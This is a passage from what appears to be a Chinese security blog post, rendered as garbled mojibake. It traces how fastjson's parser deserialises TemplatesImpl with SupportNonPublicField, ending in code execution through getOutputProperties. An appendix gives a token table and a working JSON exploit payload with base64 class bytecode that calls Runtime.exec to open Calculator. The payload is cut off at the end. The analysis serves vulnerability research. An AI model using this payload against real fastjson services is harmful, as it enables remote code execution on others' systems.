&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä»£ç è·Ÿè¸ª"><a href="#ä»£ç è·Ÿè¸ª" class="headerlink" title="ä»£ç è·Ÿè¸ª"></a>ä»£ç è·Ÿè¸ª</h2><h3 id="TemplatesImpl-classçš„å¯»æ‰¾"><a href="#TemplatesImpl-classçš„å¯»æ‰¾" class="headerlink" title="TemplatesImpl.classçš„å¯»æ‰¾"></a>TemplatesImpl.classçš„å¯»æ‰¾</h3><p>è§¦å‘ç‚¹ï¼Œä¸€å®šè¦ä¼ å…¥<code>Feature.SupportNonPublicField</code>å¦åˆ™åé¢ä¸ä¼šä¸ºéå…¬æœ‰å­—æ®µæ·»åŠ ååºåˆ—åŒ–å™¨ï¼ˆåé¢ä¼šå†æåˆ°ï¼‰<br><img src="./1569587047128.png" alt="Alt text"></p>
<p>æ­¥å…¥ <code>com.alibaba.fastjson.JSON#parseObject:181</code><br><img src="./1569587087142.png" alt="Alt text"></p>
<p>æ­¥å…¥ <code>com.alibaba.fastjson.JSON#parseObject:190</code><br>ä»å…¨å±€æ¥çœ‹æ•´ä¸ªååºåˆ—åŒ–å°†åœ¨ä¸‹é¢parseObjectè¿›è¡Œï¼Œå…¶å¤§è‡´é¡ºåºæ˜¯</p>
<ol>
<li>é…ç½®ååºåˆ—åŒ–æ—¶å¯ç”¨çš„ç‰¹æ€§ï¼Œæ¯”å¦‚æ˜¯å¦å…è®¸ååºåˆ—åŒ–éå…¬æœ‰å­—æ®µ</li>
<li>è·å–ä¸€ä¸ªjsonçš„è¯æ³•åˆ†æå¯¹è±¡parser</li>
<li>ç”¨parseråˆ†æä¼ å…¥è¿›æ¥çš„jsonå­—ç¬¦ä¸²ï¼Œè¿›è¡Œååºåˆ—åŒ–ã€‚</li>
</ol>
<p><code>/com/alibaba/fastjson/JSON.class:199</code><br><img src="./1569940580037.png" alt="Alt text"></p>
<p>å…ˆæ¥ç»†çœ‹DefaultJSONParseråˆ›å»ºè¿‡ç¨‹ï¼Œå…ˆæ‰§è¡Œç±»åˆå§‹åŒ–æ–¹æ³•ï¼ˆç•¥ï¼‰ã€‚</p>
<p>ç„¶åæ‰§è¡Œå¯¹è±¡çš„æ„é€ æ–¹æ³•ã€‚<br><code>/com/alibaba/fastjson/parser/DefaultJSONParser.class:98</code><br><img src="./1569120846409.png" alt="Alt text"></p>
<p>æ‰§è¡Œæ„é€ æ–¹æ³•çš„æ—¶å€™åˆä¼šæ–°å»ºä¸€ä¸ªJSONScannerç±»ï¼ŒJSONScannerç±»çš„ç”ŸæˆåŒæ ·å…ˆæ˜¯æ‰§è¡Œç±»åˆå§‹åŒ–ï¼ˆç•¥ï¼‰</p>
<p>ç„¶åæ˜¯å¯¹è±¡çˆ¶ç±»çš„åˆå§‹åŒ–<br><img src="./1569121697471.png" alt="Alt text"></p>
<p>å­ç±»çš„åˆå§‹åŒ–<br><code>/com/alibaba/fastjson/parser/JSONScanner.class:28</code><br><img src="./1569121849067.png" alt="Alt text"></p>
<p>ç„¶åå›åˆ°DefaultJSONParserä¸­æ‰§è¡Œæ„é€ æ–¹æ³•ï¼Œ<strong>éœ€è¦ç‰¹åˆ«è¯´æ˜æ˜¯åˆå§‹åŒ–çš„æ—¶å€™å°†å› ä¸ºä¼ å…¥çš„jsonæ˜¯<code>{</code>å¼€å¤´ï¼Œæ‰€ä»¥å°†tokenè®¾ç½®ä¸ºäº†12ï¼Œéšç€è¯æ³•åˆ†æè¿›è¡Œtokenè¿›è¡Œä¼šä¸€ç›´æ”¹å˜ï¼Œtokenä¸ä¸€æ ·æ„å‘³ç€è§£ææ¥ä¸‹æ¥jsonçš„ç­–ç•¥ä¹Ÿä¼šå˜ã€‚tokenä¸å­—ç¬¦çš„å…³è”å…³ç³»å®šä¹‰åœ¨com.alibaba.fastjson.parser.JSONToken</strong><br><code>com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser</code><br><img src="./1569122340408.png" alt="Alt text"></p>
<p>æ„é€ æ–¹æ³•å®Œæˆåæ„å‘³ç€å®è§‚æ¥çœ‹çš„å‰ä¸¤æ­¥ä¹Ÿå®Œæˆäº†ï¼Œæ­¤æ—¶æ‹¿åˆ°è¯æ³•åˆ†æå™¨parser<br><code>/com/alibaba/fastjson/JSON.class:203</code><br><img src="./1569393851685.png" alt="Alt text"></p>
<p>æ¥ç€è¿›å…¥ä»å…¨å±€æ¥çœ‹çš„æœ€åä¸€æ­¥ï¼ˆä¸‹é¢å†™çš„æ‰€æœ‰éƒ½æ˜¯ä»æœ€åä¸€æ­¥å±•å¼€åˆ†æï¼‰ã€‚è°ƒç”¨parserçš„parseObjectæ–¹æ³•ååºåˆ—åŒ–jsonã€‚è¿™é‡Œtypeæ˜¯åœ¨å†™åœ¨Pocä¸­çš„Object.classï¼Œè¿™é‡Œçš„configæ˜¯åœ¨Pocä¸­newçš„ParserConfigï¼Œæ ¹æ®ä¼ å…¥çš„ç±»ç±»å‹çš„ä¸åŒï¼Œconfigä¼šè¿”å›ä¸åŒçš„ååºåˆ—åŒ–å™¨ã€‚<br><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject:575</code><br><img src="./1569941780435.png" alt="Alt text"></p>
<p>å…ˆæ£€æŸ¥ä¼ å…¥çš„typeæ˜¯ä¸æ˜¯(æ³›å‹)æ•°ç»„ç±»å‹ï¼Œæœ€ååˆå›åˆ°DefaultJSONParserçš„parser<br><code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.class#deserialze:42</code><br><img src="./1569123937120.png" alt="Alt text"></p>
<p>parseræ–¹æ³•æ ¹æ®tokençš„ä¸åŒcaseåˆ°ä¸åŒåˆ†æ”¯é‡Œé¢ï¼Œå¼€å§‹çš„æ—¶å€™æåˆ°äº†ï¼Œåœ¨åˆ›å»ºDefaultJSONParserçš„æ—¶å€™tokenè®¾ç½®ä¸ºäº†12ã€‚<br><code>com.alibaba.fastjson.parser.DefaultJSONParser.class#parse:1295</code><br><img src="./1569123900016.png" alt="Alt text"><br><img src="./1569123997961.png" alt="Alt text"></p>
<p>case 12ï¼Œä¸»è¦è¿›è¡Œçš„æ“ä½œæ˜¯æå»å‡º<code>@type</code>å¯¹åº”çš„ç±»ï¼Œå¹¶è·å–åˆ°ç±»å¯¹è±¡å³TemplatesImplã€‚<br><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code><br><img src="./1569136890182.png" alt="Alt text"><br><img src="./1569138569725.png" alt="Alt text"></p>
<p>è¿™é‡Œå°†tokenè®¾ç½®ä¸ºäº†16ï¼ˆæ„å‘³ç€jsonåˆæ³•æƒ…å†µä¸‹ï¼Œä¸‹ä¸€ä¸ªç¬¦å·æ˜¯é€—å·ï¼‰<br><img src="./1569396571361.png" alt="Alt text"></p>
<p>æ ¹æ®TemplatesImplç±»å¯¹è±¡ï¼Œå¯»æ‰¾é’ˆå¯¹TemplatesImplçš„ååºåˆ—åŒ–å™¨ï¼Œä¹‹æ‰€ä»¥è¦æ‰¾æ–°çš„ååºåˆ—åŒ–å™¨æ˜¯ä¸ºäº†åç»­ååºåˆ—åŒ–TemplatesImplçš„å­—æ®µã€‚<br><img src="./1569396639528.png" alt="Alt text"></p>
<p>æ‰¾TemplatesImpl.classå¯¹åº”çš„ååºåˆ—åŒ–å™¨çš„ä»»åŠ¡è¿˜æ˜¯å§”æ‰˜ç»™configï¼Œä½†æ˜¯æ˜¾ç„¶configå¹¶æ²¡æœ‰ä¸“é—¨å¯¹ä»˜TemplatesImplçš„ååºåˆ—åŒ–å™¨ï¼Œæ‰€ä»¥èµ°åˆ°äº†æœ€åä¸€ä¸ªifæ¡ä»¶ï¼Œå³æŠŠTemplatesImplå½“ä½œä¸€ä¸ªJava Beanæ¥çœ‹å¹¶å¾…æ ¹æ®TemplatesImplå®é™…æƒ…å†µå®šåˆ¶ä¸€ä¸ªJavaBeanDeserializerã€‚<br><code>com/alibaba/fastjson/parser/ParserConfig.class:411</code><br><img src="./1569400686165.png" alt="Alt text"></p>
<h3 id="å®šåˆ¶ä¸€ä¸ªçš„JavaBeanDeserializeræ¥ååºåˆ—åŒ–TemplatesImpl-class"><a href="#å®šåˆ¶ä¸€ä¸ªçš„JavaBeanDeserializeræ¥ååºåˆ—åŒ–TemplatesImpl-class" class="headerlink" title="å®šåˆ¶ä¸€ä¸ªçš„JavaBeanDeserializeræ¥ååºåˆ—åŒ–TemplatesImpl.class"></a>å®šåˆ¶ä¸€ä¸ªçš„JavaBeanDeserializeræ¥ååºåˆ—åŒ–TemplatesImpl.class</h3><p>ç»†çœ‹ä¸€ä¸‹TemplatesImplç‰ˆçš„JavaBeanDeserializerå®šåˆ¶è¿‡ç¨‹ã€‚</p>
<p>ä¸€æ¥å…ˆæ„å»ºä¸€ä¸ªbeaninfo<br><code>com.alibaba.fastjson.parser.ParserConfig.class#createJavaBeanDeserializer:480</code><br><img src="./1569946978448.png" alt="Alt text"></p>
<p>beaninfoæ„å»ºçš„ç›®çš„ä¸»è¦æ˜¯æ‹¿åˆ°TemplatesImplæ»¡è¶³æ¡ä»¶çš„getterã€setterå¯¹åº”çš„Fieldå’Œæ— å‚æ„é€ æ–¹æ³•ã€‚è·å–è¿™äº›åŠæ³•å°±æ˜¯å¸¸è§„çš„å†…çœæ“ä½œã€‚<br><img src="./1569402342199.png" alt="Alt text"></p>
<p>å†…çœé‡ç‚¹æ˜¯æ»¡è¶³æ¡ä»¶çš„getterå’Œsetter<br><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:318</code></p>
<ul>
<li>æ–¹æ³•åé•¿åº¦å¤§äº4 &amp;&amp; éé™æ€å‡½æ•° &amp;&amp; è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±» &amp;&amp; å‚æ•°ä¸ªæ•°ä¸º1ä¸ª &amp;&amp; ä»¥setå¼€å¤´<br><img src="./1569982590526.png" alt="Alt text"></li>
</ul>
<p><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:458</code></p>
<ul>
<li>æ–¹æ³•åé•¿åº¦å¤§äºç­‰äº4 &amp;&amp; éé™æ€æ–¹æ³• &amp;&amp; ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™ &amp;&amp; æ— å‚æ•° &amp;&amp; è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollection Map AtomicBoolean AtomicInteger AtomicLong<br><img src="./1569983315580.png" alt="Alt text"></li>
</ul>
<p>æ‰¾åˆ°getter setterå¯¹åº”çš„å­—æ®µåï¼Œä¼šæŠŠå­—æ®µåã€å­—æ®µå¯¹åº”çš„æ–¹æ³•ã€ç±»å¯¹è±¡ç­‰æ‰“åŒ…æˆfieldInfoå¹¶addåˆ°FieldListä¸­<br><img src="./1569983723950.png" alt="Alt text"></p>
<p>æœ€åç”¨å†…çœæ‹¿åˆ°çš„å„ç§ä¸œè¥¿å»æ„å»ºJavaBeanInfo<br><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:480</code><br><img src="./1569511032560.png" alt="Alt text"></p>
<p>æ„å»ºJavaBeanInfoä¸­æœ‰ä¸€æ­¥ä¸­çš„æ“ä½œæ˜¯æŠŠFiledInfoæ’åºï¼Œæ’åºä¹‹ååé¢è¦ç”¨åˆ°FileListçš„å†…å®¹ç›´æ¥äºŒåˆ†æ³•æ‹¿ã€‚<br><code>com.alibaba.fastjson.util.JavaBeanInfo#JavaBeanInfo:70</code><br><img src="./1569511220400.png" alt="Alt text"></p>
<p>JavaBeanInfoæ„å»ºå¥½ä¼šéå†å…¶filedLIstæŸ¥çœ‹æ˜¯å¦æœ‰getOnlyçš„æ–¹æ³•ï¼Œå¦‚æœæœ‰çš„è¯åé¢å°±ä¸ä¼šç”¨asmçš„æ–¹æ³•åˆ›å»ºï¼ˆå¯¹asmä¸äº†è§£ï¼ŒæŸ¥ç½‘ä¸Šèµ„æ–™æ˜¯è¿™ä¹ˆè¯´çš„ï¼šè·å–java beançš„å±æ€§å€¼ï¼Œéœ€è¦è°ƒç”¨åå°„ï¼Œfastjsonå¼•å…¥äº†asmçš„æ¥é¿å…åå°„å¯¼è‡´çš„å¼€é”€ã€‚ï¼‰è¿™é‡Œå¾ˆä¸å¹¸ï¼ŒgetOutputPropertieså±äºgetOnlyæ–¹æ³•ï¼ˆè‡³äºä¸ºä»€ä¹ˆæ˜¯getOnlyç®€å•è·Ÿè¸ªä¸€ä¸‹FiledInfoåˆ›å»ºè¿‡ç¨‹å°±çŸ¥é“äº†ï¼Œè¿™é‡Œä¸å†å±•å¼€ï¼‰<br><img src="./1569511346335.png" alt="Alt text"></p>
<p>æ‰€ä»¥è¿™é‡Œæœ€åä¼šç”¨éasmçš„æ–¹æ³•åˆ›å»ºJavaBeanDeserializerï¼Œç”¨äººè¯è¯´å°±æ˜¯ç›´æ¥new JavaBeanDeserializer<br><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code><br><img src="./1569984381146.png" alt="Alt text"></p>
<p>JavaBeanDeserializeræ„é€ æ–¹æ³•ä¸­åˆæŠŠåˆšæ‰æ‹¿åˆ°beaninfoçš„æ“ä½œé‡å¤äº†ä¸€éï¼ˆä¸Šé¢å·²ç»è·Ÿè¿‡äº†è¿™é‡Œä¹Ÿä¸é‡å¤è·Ÿè¸ªï¼‰ã€‚<br><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:50</code><br><img src="./1569511793223.png" alt="Alt text"></p>
<p>JavaBeanDeserializeråœ¨æ„é€ æ–¹æ³•ä¸­ä¼šä¸ºæ¯ä¸€ä¸ªBeanå­—æ®µåˆ›å»ºä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œå¹¶æŠŠååºåˆ—åŒ–å™¨æ”¾åˆ°sortedFieldDeserializersä¸­<br><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:64</code><br><img src="./1569490857135.png" alt="Alt text"></p>
<p>è¿™ä¸ªååºåˆ—åŒ–å™¨é»˜è®¤æƒ…å†µä¸‹æ˜¯DeafultFiledDeserializer<br><code>com.alibaba.fastjson.parser.ParserConfig.class#createFieldDeserializer:565</code><br><img src="./1569491000388.png" alt="Alt text"><br><img src="./1569512316826.png" alt="Alt text"><br><img src="./1569512351441.png" alt="Alt text"></p>
<p>æœ€åä¼šæŠŠJavaBeanDeserializerçš„Teamplaytesimplæ–¹æ³•åˆ°ååºåˆ—åŒ–å™¨çš„åºåˆ—ä¸­ï¼ˆå¦‚æœåé¢å…¶å®ƒä¹Ÿè¦ç”¨å°±ä¸ç”¨é‡æ–°åˆ›å»ºä¸€æ¬¡äº†ï¼‰<br><img src="./1569487153087.png" alt="Alt text"></p>
<p>è‡³æ­¤JavaBeanDeserializerå®šåˆ¶å®Œæˆï¼Œä¸‹é¢å°±å¼€å§‹æ­£å¼ååºåˆ—åŒ–TemplatesImpl<br><img src="./1569569979360.png" alt="Alt text"></p>
<h3 id="JavaBeanDeserializer-deserialze"><a href="#JavaBeanDeserializer-deserialze" class="headerlink" title="JavaBeanDeserializer.deserialze"></a>JavaBeanDeserializer.deserialze</h3><p>deserialzeå¾€ä¸‹è·Ÿå‡ æ­¥ä¼šè¿›å…¥label1064ï¼Œä»å®è§‚æ¥çœ‹ä¸»è¦çš„æ“ä½œéƒ½åœ¨label1064å’Œå…¶å­labelä¸­ï¼Œåšäº†ä»¥ä¸‹è¿™å‡ ä»¶äº‹æƒ…ã€‚</p>
<ol>
<li>åˆ›å»ºTemplatesImplå¯¹è±¡</li>
<li>ç»§ç»­è¯»å–jsonå­—ç¬¦ä¸²å†…å®¹</li>
<li>ç”¨å­—æ®µçš„ååºåˆ—åŒ–å™¨æŠŠè¯»åˆ°å†…å®¹setåˆ°TemplatesImplå¯¹è±¡ä¸­<br><img src="./1569513241314.png" alt="Alt text"></li>
</ol>
<p>ç¬¬ä¸€æ­¥åˆ›å»ºTemplatesImplå¯¹è±¡<br><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:579</code><br><img src="./1569513602747.png" alt="Alt text"></p>
<p>ç¬¬äºŒæ­¥æ ¹æ®ä»jsonå­—ç¬¦ä¸²è¯»å‡ºçš„keyï¼Œååºåˆ—åŒ–å¯¹åº”å­—æ®µ<br><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:606</code><br><img src="./1569997637825.png" alt="Alt text"><br><img src="./1569513780402.png" alt="Alt text"></p>
<p>å¾€ä¸‹è·Ÿçš„è¯<strong>ä¹‹å‰è®¾ç½®çš„Feature.SupportNonPublicField.maskåœ¨è¿™é‡Œå°±å‘æŒ¥ä½œç”¨äº†ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªåœ¨TemplatesImplè¿™æ¡é“¾ä¸­_bytecodeså› ä¸ºæ˜¯ç§æœ‰å­—æ®µçš„åŸå› æœ€åå°±ä¸ä¼šè¢«ååºåˆ—åŒ–ã€‚</strong><code>SupportNonPublicField</code>é€‰é¡¹ä¼šæŠŠ<strong>æ‰€æœ‰å­—æ®µ</strong>çš„ååºåˆ—åŒ–å™¨å…¨éƒ¨ç”Ÿæˆå¹¶æ”¾åˆ°extraFieldDeserializersä¸­ã€‚<br><code>com.alibaba.fastjson.parser.DefaultJSONParser:747</code><br><img src="./1569592836749.png" alt="Alt text"><br><img src="./1569987252636.png" alt="Alt text"></p>
<p>ç¬¬ä¸‰æ­¥åˆ°äº†æœ€åçš„æ—¶åˆ»ï¼Œå¥½æˆä¸Šæ¼”ã€‚æœ€åä¸€æ­¥ä»å±€éƒ¨å®è§‚æ¥çœ‹è¿˜å¯å†ç»†åˆ†ä¸ºä¸‰æ­¥<br>1.è·å–ç›´æ¥å’Œå­—æ®µå€¼æ‰“äº¤é“çš„ååºåˆ—åŒ–å™¨fieldValueDeserilizer<br>2.ååºåˆ—åŒ–æ‹¿å­—æ®µå¯¹è±¡<br>3.æŠŠå­—æ®µå¯¹è±¡setåˆ°objectä¸­ï¼ˆå¦‚æœå­—æ®µå¯¹è±¡çš„fieldInfoæ˜¯getOnlyï¼Œåˆ™ä¼šåå°„è°ƒç”¨getteræ–¹æ³•ï¼Œä»å¾®è§‚æ¥è®²RCEé—®é¢˜å‡ºåœ¨è¿™ä¸ªåœ°æ–¹ï¼‰<br><img src="./1569570858786.png" alt="Alt text"></p>
<p>ä»¥_bytecodesä¸ºä¾‹<br>ç¬¬ä¸€æ­¥ æ²¡å•¥å¥½è¯´çš„ä¾æ—§é€šè¿‡configç±»è·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨<br><img src="./1569633321786.png" alt="Alt text"></p>
<p>ç¬¬äºŒæ­¥ fieldValueDeserilizeræ˜¯ObjectArrayCodecï¼Œè´Ÿè´£æŠŠbase64ç¼–ç è§£ç <br><img src="./1569574729954.png" alt="Alt text"><br><img src="./1569575532296.png" alt="Alt text"><br><img src="./1569575672975.png" alt="Alt text"><br><img src="./1569575793082.png" alt="Alt text"></p>
<p>ç¬¬ä¸‰æ­¥ å°±æ˜¯æŠŠæ‹¿åˆ°çš„å€¼æ”¾åˆ°TemplatesImplå¯¹è±¡ä¸­äº†<br><img src="./1569636061623.png" alt="Alt text"><br><img src="./1569636169022.png" alt="Alt text"></p>
<p>_nameï¼Œ_tfactoryï¼Œ_outputPropertiesçš„ååºåˆ—åŒ–å¤§åŒå°å¼‚</p>
<p>è¯´æ³•åœ¨ååºåˆ—åŒ–_outputPropertiesçš„æ—¶å€™<br><img src="./1569835286521.png" alt="Alt text"></p>
<p>åœ¨ç¬¬ä¸‰æ­¥setValueçš„æ—¶å€™ï¼Œå› ä¸º_outputPropertiesæ˜¯getOnlyçš„æ‰€ä»¥è¿›å…¥ä¸ä¸€æ ·çš„åˆ†æ”¯ï¼Œå¹¶è§¦å‘å®ƒç›¸åº”çš„getæ–¹æ³•å³getOutputPropertiesï¼Œæœ€åä¼šè§¦å‘Testçš„æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚<br><img src="./1570001070880.png" alt="Alt text"></p>
<p>å› ä¸ºæœ¬æ–‡ä¸»è¦æƒ³æè¿°fastjosnçš„å¤§è‡´æµç¨‹ï¼Œåé¢å’Œåå°„éƒ¨åˆ†å’Œfastjsonå…³è”æ€§ä¸å¤§äº†ï¼Œå°±ä¸ç»†è·Ÿäº†ã€‚ä¸è¿‡å¦‚æœç»†è·Ÿçš„è¯å°±ä¼šå‘ç°ä¸ºå•¥payloadæ˜¯è¿™ä¹ˆæ„é€ ã€‚ï¼ˆjsonä¸­çœ‹ä¼¼å¤šä½™å­—æ®µä¸ºå•¥è¦åŠ ï¼Œä¸ºå•¥è¦ç»§æ‰¿AbstractTransletç­‰ç­‰ï¼Œè¯´ç™½äº†å°±æ˜¯å¦‚æœä¸è¿™æ ·è¿›å…¥ä¸äº†è§¦å‘æ— å‚æ„é€ å™¨çš„åˆ†æ”¯ï¼‰ã€‚<br><img src="./1569837134265.png" alt="Alt text"></p>
<h2 id="æ‚æƒ³"><a href="#æ‚æƒ³" class="headerlink" title="æ‚æƒ³"></a>æ‚æƒ³</h2><p>å¼„æ‡‚æ•´ä½“æµç¨‹ï¼Œå¼„æ‡‚æ¯ä¸ªå¤§æµç¨‹ä¸‹çš„å°æµç¨‹ï¼Œå¼„æ‡‚æµç¨‹ä¹‹é—´å‚æ•°çš„å‹¾è¿å…³ç³»ã€‚<br>ä»ä»£ç ä¸Šæ¥è¯´ï¼Œä»åŠŸèƒ½æ¥è¯´ã€‚<br>ä»å¤§æµç¨‹ä¸Šæ¥è¯´ï¼Œä»å¤§æµç¨‹ä¸­å°æµç¨‹æ¥è¯´ã€‚<br>å¥—è·¯æˆ–è€…è¯´å®šæ€§çš„è§„å¾‹</p>
<h2 id="é™„"><a href="#é™„" class="headerlink" title="é™„"></a>é™„</h2><h3 id="fastjsonçš„é»‘åå•"><a href="#fastjsonçš„é»‘åå•" class="headerlink" title="fastjsonçš„é»‘åå•"></a>fastjsonçš„é»‘åå•</h3><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<h3 id="tokenå¯¹åº”è¡¨"><a href="#tokenå¯¹åº”è¡¨" class="headerlink" title="tokenå¯¹åº”è¡¨"></a>tokenå¯¹åº”è¡¨</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;** 1 å…³è”åˆ° error *&#x2F;</span><br><span class="line">public final static int ERROR                &#x3D; 1;</span><br><span class="line">&#x2F;** 2 å…³è”åˆ° int *&#x2F;</span><br><span class="line">public final static int LITERAL_INT          &#x3D; 2;</span><br><span class="line">&#x2F;** 3 å…³è”åˆ° float *&#x2F;</span><br><span class="line">public final static int LITERAL_FLOAT        &#x3D; 3;</span><br><span class="line">&#x2F;** 4 å…³è”åˆ° string *&#x2F;</span><br><span class="line">public final static int LITERAL_STRING       &#x3D; 4;</span><br><span class="line">&#x2F;** 5 å…³è”åˆ° iso8601 *&#x2F;</span><br><span class="line">public final static int LITERAL_ISO8601_DATE &#x3D; 5;</span><br><span class="line">&#x2F;** 6 å…³è”åˆ° true *&#x2F;</span><br><span class="line">public final static int TRUE                 &#x3D; 6;</span><br><span class="line">&#x2F;** 7 å…³è”åˆ° false *&#x2F;</span><br><span class="line">public final static int FALSE                &#x3D; 7;</span><br><span class="line">&#x2F;** 8 å…³è”åˆ° null *&#x2F;</span><br><span class="line">public final static int NULL                 &#x3D; 8;</span><br><span class="line">&#x2F;** 9 å…³è”åˆ° new *&#x2F;</span><br><span class="line">public final static int NEW                  &#x3D; 9;</span><br><span class="line">&#x2F;** 10 å…³è”åˆ° ( *&#x2F;</span><br><span class="line">public final static int LPAREN               &#x3D; 10;</span><br><span class="line">&#x2F;** 11 å…³è”åˆ° ) *&#x2F;</span><br><span class="line">public final static int RPAREN               &#x3D; 11;</span><br><span class="line">&#x2F;** 12 å…³è”åˆ° &#123; *&#x2F;</span><br><span class="line">public final static int LBRACE               &#x3D; 12;</span><br><span class="line">&#x2F;** 13 å…³è”åˆ° &#125; *&#x2F;</span><br><span class="line">public final static int RBRACE               &#x3D; 13;</span><br><span class="line">&#x2F;** 14 å…³è”åˆ° [ *&#x2F;</span><br><span class="line">public final static int LBRACKET             &#x3D; 14;</span><br><span class="line">&#x2F;** 15 å…³è”åˆ° ] *&#x2F;</span><br><span class="line">public final static int RBRACKET             &#x3D; 15;</span><br><span class="line">&#x2F;** 16 å…³è”åˆ° , *&#x2F;</span><br><span class="line">public final static int COMMA                &#x3D; 16;</span><br><span class="line">&#x2F;** 17 å…³è”åˆ° : *&#x2F;</span><br><span class="line">public final static int COLON                &#x3D; 17;</span><br><span class="line">&#x2F;** 18 å…³è”åˆ° ident *&#x2F;</span><br><span class="line">public final static int IDENTIFIER           &#x3D; 18;</span><br><span class="line">&#x2F;** 19 å…³è”åˆ° fieldName *&#x2F;</span><br><span class="line">public final static int FIELD_NAME           &#x3D; 19;</span><br><span class="line">&#x2F;** 20 å…³è”åˆ° EOF *&#x2F;</span><br><span class="line">public final static int EOF                  &#x3D; 20;</span><br><span class="line">&#x2F;** 21 å…³è”åˆ° Set *&#x2F;</span><br><span class="line">public final static int SET                  &#x3D; 21;</span><br><span class="line">&#x2F;** 22 å…³è”åˆ° TreeSet *&#x2F;</span><br><span class="line">public final static int TREE_SET             &#x3D; 22;</span><br><span class="line">&#x2F;** 23 å…³è”åˆ° undefined *&#x2F;</span><br><span class="line">public final static int UNDEFINED            &#x3D; 23; &#x2F;&#x2F; undefined</span><br><span class="line">&#x2F;** 24 å…³è”åˆ° ; *&#x2F;</span><br><span class="line">public final static int SEMI                 &#x3D; 24;</span><br><span class="line">&#x2F;** 25 å…³è”åˆ° . *&#x2F;</span><br><span class="line">public final static int DOT                  &#x3D; 25;</span><br><span class="line">&#x2F;** 26 å…³è”åˆ° hex *&#x2F;</span><br><span class="line">public final static int HEX                  &#x3D; 26;</span><br></pre></td></tr></table></figure>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEAIW9wZW4gL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAEVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAQAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAA